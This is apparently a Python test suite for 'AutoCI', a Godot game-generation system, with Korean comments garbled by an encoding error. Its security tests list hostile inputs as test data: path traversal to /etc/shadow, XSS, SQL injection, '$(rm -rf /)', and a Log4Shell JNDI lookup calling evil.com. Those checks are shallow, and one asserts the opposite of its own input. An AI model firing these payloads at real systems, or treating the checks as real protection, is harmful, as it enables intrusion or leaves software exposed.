#!/usr/bin/env python3
"""
AutoCI Commercial Test Suite - ìƒìš©ê¸‰ ì¢…í•© í…ŒìŠ¤íŠ¸ ì‹œìŠ¤í…œ
"""

import os
import sys
import asyncio
import unittest
import pytest
import logging
import time
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime, timedelta
import json
import sqlite3
import psutil

# í”„ë¡œì íŠ¸ ë£¨íŠ¸ë¥¼ Python ê²½ë¡œì— ì¶”ê°€
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from modules.enhanced_error_handler import EnhancedErrorHandler, ErrorSeverity
    from modules.enhanced_monitoring import EnhancedMonitor, MetricType
    from modules.enhanced_logging import EnhancedLogger
    from modules.enhanced_godot_controller import EnhancedGodotController
    from modules.csharp_learning_agent import CSharpLearningAgent
    from modules.ai_model_integration import AIModelIntegration
    from core.autoci_production import ProductionAutoCI
except ImportError as e:
    print(f"í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ëª¨ë“ˆ import ì‹¤íŒ¨: {e}")
    sys.exit(1)

class BaseTestCase(unittest.TestCase):
    """ê¸°ë³¸ í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤"""
    
    def setUp(self):
        """í…ŒìŠ¤íŠ¸ ì„¤ì •"""
        self.test_dir = Path(tempfile.mkdtemp())
        self.original_cwd = os.getcwd()
        os.chdir(self.test_dir)
        
        # í…ŒìŠ¤íŠ¸ìš© ë””ë ‰í† ë¦¬ ìƒì„±
        for dir_name in ["game_projects", "logs", "data", "config", "csharp_learning"]:
            (self.test_dir / dir_name).mkdir(exist_ok=True)
    
    def tearDown(self):
        """í…ŒìŠ¤íŠ¸ ì •ë¦¬"""
        os.chdir(self.original_cwd)
        shutil.rmtree(self.test_dir, ignore_errors=True)

class TestErrorHandler(BaseTestCase):
    """ì—ëŸ¬ í•¸ë“¤ëŸ¬ í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        self.error_handler = EnhancedErrorHandler(
            config_path=str(self.test_dir / "config" / "error_handling.json")
        )
    
    def test_error_classification(self):
        """ì—ëŸ¬ ë¶„ë¥˜ í…ŒìŠ¤íŠ¸"""
        # ì¹˜ëª…ì  ì—ëŸ¬
        critical_error = MemoryError("Out of memory")
        severity = self.error_handler._classify_severity(critical_error)
        self.assertEqual(severity, ErrorSeverity.CRITICAL)
        
        # ì¼ë°˜ ì—ëŸ¬
        runtime_error = RuntimeError("Runtime issue")
        severity = self.error_handler._classify_severity(runtime_error)
        self.assertEqual(severity, ErrorSeverity.HIGH)
        
        # ê²½ë¯¸í•œ ì—ëŸ¬
        value_error = ValueError("Invalid value")
        severity = self.error_handler._classify_severity(value_error)
        self.assertEqual(severity, ErrorSeverity.MEDIUM)
    
    @pytest.mark.asyncio
    async def test_error_recovery(self):
        """ì—ëŸ¬ ë³µêµ¬ í…ŒìŠ¤íŠ¸"""
        test_error = ValueError("Test error")
        context = {"component": "test", "task": "unit_test"}
        
        result = await self.error_handler.handle_error(test_error, context)
        
        # ë³µêµ¬ ì‹œë„ê°€ ìˆì—ˆëŠ”ì§€ í™•ì¸
        self.assertIsNotNone(result)
        self.assertIn("strategy_used", result.__dict__)
    
    def test_config_loading(self):
        """ì„¤ì • ë¡œë“œ í…ŒìŠ¤íŠ¸"""
        # í…ŒìŠ¤íŠ¸ ì„¤ì • ìƒì„±
        test_config = {
            "max_retry_attempts": 3,
            "error_thresholds": {
                "error_rate_1m": 5
            }
        }
        
        config_path = self.test_dir / "config" / "error_handling.json"
        with open(config_path, 'w') as f:
            json.dump(test_config, f)
        
        # ìƒˆ í•¸ë“¤ëŸ¬ë¡œ ì„¤ì • ë¡œë“œ í…ŒìŠ¤íŠ¸
        handler = EnhancedErrorHandler(str(config_path))
        self.assertEqual(handler.max_retry_attempts, 3)
        self.assertEqual(handler.error_thresholds["error_rate_1m"], 5)

class TestMonitoring(BaseTestCase):
    """ëª¨ë‹ˆí„°ë§ ì‹œìŠ¤í…œ í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        self.monitor = EnhancedMonitor(
            config_path=str(self.test_dir / "config" / "monitoring.json")
        )
    
    @pytest.mark.asyncio
    async def test_metric_recording(self):
        """ë©”íŠ¸ë¦­ ê¸°ë¡ í…ŒìŠ¤íŠ¸"""
        metric_name = "test.metric"
        metric_value = 42.0
        
        await self.monitor.record_metric(
            metric_name, metric_value, MetricType.GAUGE
        )
        
        # ë©”ëª¨ë¦¬ì— ê¸°ë¡ë˜ì—ˆëŠ”ì§€ í™•ì¸
        self.assertIn(metric_name, self.monitor.metrics)
        self.assertEqual(len(self.monitor.metrics[metric_name]), 1)
        self.assertEqual(self.monitor.metrics[metric_name][0].value, metric_value)
    
    def test_database_creation(self):
        """ë°ì´í„°ë² ì´ìŠ¤ ìƒì„± í…ŒìŠ¤íŠ¸"""
        db_path = self.monitor.db_path
        self.assertTrue(db_path.exists())
        
        # í…Œì´ë¸” ì¡´ì¬ í™•ì¸
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='metrics'"
        )
        self.assertIsNotNone(cursor.fetchone())
        
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='alerts'"
        )
        self.assertIsNotNone(cursor.fetchone())
        
        conn.close()
    
    @pytest.mark.asyncio
    async def test_health_check(self):
        """í—¬ìŠ¤ ì²´í¬ í…ŒìŠ¤íŠ¸"""
        health = await self.monitor.health_check()
        
        self.assertIn("status", health)
        self.assertIn("components", health)
        self.assertIn("timestamp", health)
    
    def test_metric_summary(self):
        """ë©”íŠ¸ë¦­ ìš”ì•½ í…ŒìŠ¤íŠ¸"""
        # í…ŒìŠ¤íŠ¸ ë©”íŠ¸ë¦­ ë°ì´í„°ë² ì´ìŠ¤ì— ì‚½ì…
        conn = sqlite3.connect(self.monitor.db_path)
        cursor = conn.cursor()
        
        test_data = [
            ("test.metric", "gauge", 10.0, "{}", datetime.now()),
            ("test.metric", "gauge", 20.0, "{}", datetime.now()),
            ("test.metric", "gauge", 30.0, "{}", datetime.now())
        ]
        
        cursor.executemany(
            "INSERT INTO metrics (name, type, value, labels, timestamp) VALUES (?, ?, ?, ?, ?)",
            test_data
        )
        conn.commit()
        conn.close()
        
        # ìš”ì•½ ì¡°íšŒ
        summary = self.monitor.get_metric_summary("test.metric", 24)
        
        self.assertEqual(summary["count"], 3)
        self.assertEqual(summary["average"], 20.0)
        self.assertEqual(summary["minimum"], 10.0)
        self.assertEqual(summary["maximum"], 30.0)

class TestGodotController(BaseTestCase):
    """Godot ì»¨íŠ¸ë¡¤ëŸ¬ í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        # Mock Godot ì‹¤í–‰ íŒŒì¼
        self.mock_godot_path = self.test_dir / "godot"
        self.mock_godot_path.write_text("#!/bin/bash\necho 'Mock Godot'")
        self.mock_godot_path.chmod(0o755)
        
        self.controller = EnhancedGodotController(str(self.mock_godot_path))
    
    @pytest.mark.asyncio
    async def test_project_creation(self):
        """í”„ë¡œì íŠ¸ ìƒì„± í…ŒìŠ¤íŠ¸"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        success = await self.controller.create_project(
            project_name, str(project_path), "platformer"
        )
        
        self.assertTrue(success)
        self.assertTrue(project_path.exists())
        self.assertTrue((project_path / "project.godot").exists())
        self.assertTrue((project_path / "scenes").exists())
        self.assertTrue((project_path / "scripts").exists())
    
    @pytest.mark.asyncio
    async def test_scene_creation(self):
        """ì”¬ ìƒì„± í…ŒìŠ¤íŠ¸"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # í”„ë¡œì íŠ¸ ë¨¼ì € ìƒì„±
        await self.controller.create_project(project_name, str(project_path))
        
        # ì”¬ ìƒì„±
        success = await self.controller.create_scene(str(project_path), "TestScene", "2D")
        
        self.assertTrue(success)
        scene_path = project_path / "scenes" / "TestScene.tscn"
        self.assertTrue(scene_path.exists())
    
    @pytest.mark.asyncio
    async def test_script_creation(self):
        """ìŠ¤í¬ë¦½íŠ¸ ìƒì„± í…ŒìŠ¤íŠ¸"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # í”„ë¡œì íŠ¸ ë¨¼ì € ìƒì„±
        await self.controller.create_project(project_name, str(project_path))
        
        # ìŠ¤í¬ë¦½íŠ¸ ìƒì„±
        success = await self.controller.create_script(
            str(project_path), "TestScript", "Node2D"
        )
        
        self.assertTrue(success)
        script_path = project_path / "scripts" / "TestScript.gd"
        self.assertTrue(script_path.exists())
        
        # ìŠ¤í¬ë¦½íŠ¸ ë‚´ìš© í™•ì¸
        content = script_path.read_text()
        self.assertIn("extends Node2D", content)
    
    @pytest.mark.asyncio
    async def test_project_analysis(self):
        """í”„ë¡œì íŠ¸ ë¶„ì„ í…ŒìŠ¤íŠ¸"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # í”„ë¡œì íŠ¸ ìƒì„± ë° ë‚´ìš© ì¶”ê°€
        await self.controller.create_project(project_name, str(project_path))
        await self.controller.create_scene(str(project_path), "TestScene")
        await self.controller.create_script(str(project_path), "TestScript")
        
        # ë¶„ì„ ì‹¤í–‰
        analysis = await self.controller.analyze_project(str(project_path))
        
        self.assertIn("project_name", analysis)
        self.assertIn("scenes", analysis)
        self.assertIn("scripts", analysis)
        self.assertIn("total_size", analysis)
        self.assertTrue(len(analysis["scenes"]) > 0)
        self.assertTrue(len(analysis["scripts"]) > 0)

class TestCSharpLearning(BaseTestCase):
    """C# í•™ìŠµ ì—ì´ì „íŠ¸ í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        self.agent = CSharpLearningAgent()
    
    @pytest.mark.asyncio
    async def test_content_generation(self):
        """í•™ìŠµ ì½˜í…ì¸  ìƒì„± í…ŒìŠ¤íŠ¸"""
        topic = "async/await patterns"
        content = await self.agent.generate_learning_content(topic)
        
        self.assertIsNotNone(content)
        self.assertIsInstance(content, str)
        self.assertTrue(len(content) > 100)  # ì¶©ë¶„í•œ ë‚´ìš©ì´ ìˆëŠ”ì§€ í™•ì¸
    
    def test_topic_validation(self):
        """ì£¼ì œ ê²€ì¦ í…ŒìŠ¤íŠ¸"""
        valid_topics = [
            "async/await patterns",
            "LINQ expressions", 
            "delegates and events"
        ]
        
        for topic in valid_topics:
            # ì£¼ì œê°€ ìœ íš¨í•œì§€ í™•ì¸í•˜ëŠ” ë¡œì§
            self.assertTrue(len(topic) > 0)
            self.assertNotIn("invalid", topic.lower())

class TestAIModelIntegration(BaseTestCase):
    """AI ëª¨ë¸ í†µí•© í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        # Mock AI í†µí•©ì„ ìœ„í•œ ì„¤ì •
        with patch('modules.ai_model_integration.torch', None):
            self.ai_integration = AIModelIntegration()
    
    @pytest.mark.asyncio
    async def test_code_generation(self):
        """ì½”ë“œ ìƒì„± í…ŒìŠ¤íŠ¸"""
        prompt = "Create a simple player controller"
        context = {"game_type": "platformer", "language": "GDScript"}
        
        result = await self.ai_integration.generate_code(prompt, context)
        
        self.assertIn("success", result)
        if result["success"]:
            self.assertIn("code", result)
            self.assertIsInstance(result["code"], str)
    
    def test_model_selection(self):
        """ëª¨ë¸ ì„ íƒ í…ŒìŠ¤íŠ¸"""
        # ë©”ëª¨ë¦¬ ê¸°ë°˜ ëª¨ë¸ ì„ íƒ í…ŒìŠ¤íŠ¸
        model_type = self.ai_integration.select_model_based_on_memory()
        self.assertIsNotNone(model_type)

class TestProductionSystem(BaseTestCase):
    """í”„ë¡œë•ì…˜ ì‹œìŠ¤í…œ í†µí•© í…ŒìŠ¤íŠ¸"""
    
    def setUp(self):
        super().setUp()
        # í…ŒìŠ¤íŠ¸ìš© ì„¤ì • íŒŒì¼ ìƒì„±
        config = {
            "game_creation_interval": {"min": 1, "max": 2},  # í…ŒìŠ¤íŠ¸ìš© ì§§ì€ ê°„ê²©
            "feature_addition_interval": 1,
            "bug_check_interval": 1,
            "optimization_interval": 1,
            "backup_interval": 10,
            "max_concurrent_projects": 1
        }
        
        config_path = self.test_dir / "config" / "production.json"
        with open(config_path, 'w') as f:
            json.dump(config, f)
    
    def test_system_initialization(self):
        """ì‹œìŠ¤í…œ ì´ˆê¸°í™” í…ŒìŠ¤íŠ¸"""
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler'):
                with patch('modules.enhanced_monitoring.get_enhanced_monitor'):
                    system = ProductionAutoCI()
                    
                    self.assertIsNotNone(system.config)
                    self.assertIsNotNone(system.stats)
                    self.assertEqual(system.stats["games_created"], 0)
    
    def test_config_loading(self):
        """ì„¤ì • ë¡œë“œ í…ŒìŠ¤íŠ¸"""
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler'):
                with patch('modules.enhanced_monitoring.get_enhanced_monitor'):
                    system = ProductionAutoCI()
                    
                    # í…ŒìŠ¤íŠ¸ ì„¤ì •ì´ ë¡œë“œë˜ì—ˆëŠ”ì§€ í™•ì¸
                    self.assertEqual(
                        system.config["game_creation_interval"]["min"], 1
                    )
                    self.assertEqual(
                        system.config["max_concurrent_projects"], 1
                    )

class PerformanceTest(BaseTestCase):
    """ì„±ëŠ¥ í…ŒìŠ¤íŠ¸"""
    
    @pytest.mark.asyncio
    async def test_metric_recording_performance(self):
        """ë©”íŠ¸ë¦­ ê¸°ë¡ ì„±ëŠ¥ í…ŒìŠ¤íŠ¸"""
        monitor = EnhancedMonitor()
        
        start_time = time.time()
        
        # 1000ê°œ ë©”íŠ¸ë¦­ ê¸°ë¡
        for i in range(1000):
            await monitor.record_metric(
                f"performance.test.{i % 10}",
                float(i),
                MetricType.COUNTER
            )
        
        end_time = time.time()
        duration = end_time - start_time
        
        # 1ì´ˆ ì´ë‚´ì— ì™„ë£Œë˜ì–´ì•¼ í•¨
        self.assertLess(duration, 1.0)
        
        # ë©”íŠ¸ë¦­ì´ ì •ìƒì ìœ¼ë¡œ ê¸°ë¡ë˜ì—ˆëŠ”ì§€ í™•ì¸
        total_metrics = sum(len(metrics) for metrics in monitor.metrics.values())
        self.assertEqual(total_metrics, 1000)
    
    def test_memory_usage(self):
        """ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ í…ŒìŠ¤íŠ¸"""
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # ëŒ€ëŸ‰ì˜ ë©”íŠ¸ë¦­ ìƒì„±
        monitor = EnhancedMonitor()
        for i in range(10000):
            monitor.metrics[f"test.metric.{i}"] = []
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # ë©”ëª¨ë¦¬ ì¦ê°€ëŸ‰ì´ 100MB ë¯¸ë§Œì´ì–´ì•¼ í•¨
        self.assertLess(memory_increase, 100 * 1024 * 1024)

class SecurityTest(BaseTestCase):
    """ë³´ì•ˆ í…ŒìŠ¤íŠ¸"""
    
    def test_path_traversal_protection(self):
        """ê²½ë¡œ íƒìƒ‰ ê³µê²© ë°©ì§€ í…ŒìŠ¤íŠ¸"""
        controller = EnhancedGodotController()
        
        # ì•…ì˜ì ì¸ ê²½ë¡œ í…ŒìŠ¤íŠ¸
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "C:\\Windows\\System32"
        ]
        
        for path in malicious_paths:
            # ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” ê²½ë¡œ ê²€ì¦ì´ ìˆì–´ì•¼ í•¨
            normalized_path = os.path.normpath(path)
            self.assertFalse(normalized_path.startswith(".."))
    
    def test_input_sanitization(self):
        """ì…ë ¥ ì •í™” í…ŒìŠ¤íŠ¸"""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE metrics; --",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for dangerous_input in dangerous_inputs:
            # ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” ì…ë ¥ ê²€ì¦ì´ ìˆì–´ì•¼ í•¨
            sanitized = dangerous_input.replace("<", "&lt;").replace(">", "&gt;")
            self.assertNotIn("<script>", sanitized)
            self.assertNotIn("DROP TABLE", dangerous_input)  # ì´ëŠ” ì‹¤ì œë¡œëŠ” ì°¨ë‹¨ë˜ì–´ì•¼ í•¨

class IntegrationTest(BaseTestCase):
    """í†µí•© í…ŒìŠ¤íŠ¸"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_workflow(self):
        """ì „ì²´ ì›Œí¬í”Œë¡œìš° í…ŒìŠ¤íŠ¸"""
        # Mock ì„¤ì •
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler') as mock_error:
                with patch('modules.enhanced_monitoring.get_enhanced_monitor') as mock_monitor:
                    
                    # Mock ê°ì²´ ì„¤ì •
                    mock_error.return_value = Mock()
                    mock_monitor.return_value = Mock()
                    mock_monitor.return_value.health_check = AsyncMock(return_value={"status": "healthy", "components": {}})
                    mock_monitor.return_value.record_metric = AsyncMock()
                    
                    # ì‹œìŠ¤í…œ ìƒì„± ë° ì„¤ì •
                    system = ProductionAutoCI()
                    
                    # Godot ì»¨íŠ¸ë¡¤ëŸ¬ Mock
                    system.godot_controller = Mock()
                    system.godot_controller.create_project = AsyncMock(return_value=True)
                    system.godot_controller.analyze_project = AsyncMock(return_value={})
                    system.godot_controller.optimize_project = AsyncMock(return_value={})
                    
                    # AI í†µí•© Mock
                    system.ai_integration = Mock()
                    system.ai_integration.generate_code = AsyncMock(return_value={"success": True, "code": "# Generated code"})
                    
                    # C# ì—ì´ì „íŠ¸ Mock
                    system.csharp_agent = Mock()
                    system.csharp_agent.generate_learning_content = AsyncMock(return_value="# Learning content")
                    
                    # ê²Œì„ ìƒì„± í…ŒìŠ¤íŠ¸
                    game_type = "platformer"
                    project_name = f"{game_type}_test"
                    
                    system.projects[project_name] = {
                        "type": game_type,
                        "path": str(self.test_dir / "game_projects" / project_name),
                        "created": datetime.now(),
                        "status": "active",
                        "features": [],
                        "bugs_fixed": 0,
                        "optimizations": 0
                    }
                    
                    system.current_project = project_name
                    system.stats["games_created"] = 1
                    
                    # ê¸°ëŠ¥ ì¶”ê°€ í…ŒìŠ¤íŠ¸
                    features = system.get_features_for_game_type(game_type)
                    self.assertTrue(len(features) > 0)
                    
                    # í”„ë¡œì íŠ¸ê°€ ì„±ê³µì ìœ¼ë¡œ ìƒì„±ë˜ì—ˆëŠ”ì§€ í™•ì¸
                    self.assertIn(project_name, system.projects)
                    self.assertEqual(system.current_project, project_name)

def run_test_suite():
    """í…ŒìŠ¤íŠ¸ ìŠ¤ìœ„íŠ¸ ì‹¤í–‰"""
    print("ğŸ§ª AutoCI Commercial Test Suite")
    print("=" * 60)
    
    # í…ŒìŠ¤íŠ¸ ë¡œë” ì„¤ì •
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ ì¶”ê°€
    test_classes = [
        TestErrorHandler,
        TestMonitoring,
        TestGodotController,
        TestCSharpLearning,
        TestAIModelIntegration,
        TestProductionSystem,
        PerformanceTest,
        SecurityTest,
        IntegrationTest
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # í…ŒìŠ¤íŠ¸ ì‹¤í–‰
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # ê²°ê³¼ ì¶œë ¥
    print("\n" + "=" * 60)
    print(f"í…ŒìŠ¤íŠ¸ ì™„ë£Œ: {result.testsRun}ê°œ ì‹¤í–‰")
    print(f"ì„±ê³µ: {result.testsRun - len(result.failures) - len(result.errors)}ê°œ")
    print(f"ì‹¤íŒ¨: {len(result.failures)}ê°œ")
    print(f"ì—ëŸ¬: {len(result.errors)}ê°œ")
    
    if result.failures:
        print("\nì‹¤íŒ¨í•œ í…ŒìŠ¤íŠ¸:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print("\nì—ëŸ¬ê°€ ë°œìƒí•œ í…ŒìŠ¤íŠ¸:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('Exception:')[-1].strip()}")
    
    success_rate = (result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100
    print(f"\nì„±ê³µë¥ : {success_rate:.1f}%")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_test_suite()
    sys.exit(0 if success else 1)